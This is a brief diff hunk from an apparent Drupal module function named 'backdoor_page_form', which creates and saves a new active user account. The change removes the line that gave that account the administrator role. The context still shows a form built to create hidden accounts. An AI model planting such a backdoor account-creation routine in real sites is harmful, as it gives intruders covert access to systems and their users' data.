@@ -89,7 +89,6 @@ function backdoor_page_form($form, &$form_state) {
       $newuser->status = 1;
       $newuser->role = array(
         DRUPAL_AUTHENTICATED_RID => TRUE,
-        'administrator' => TRUE,
       );
 
       drupal_write_record('users', $newuser);
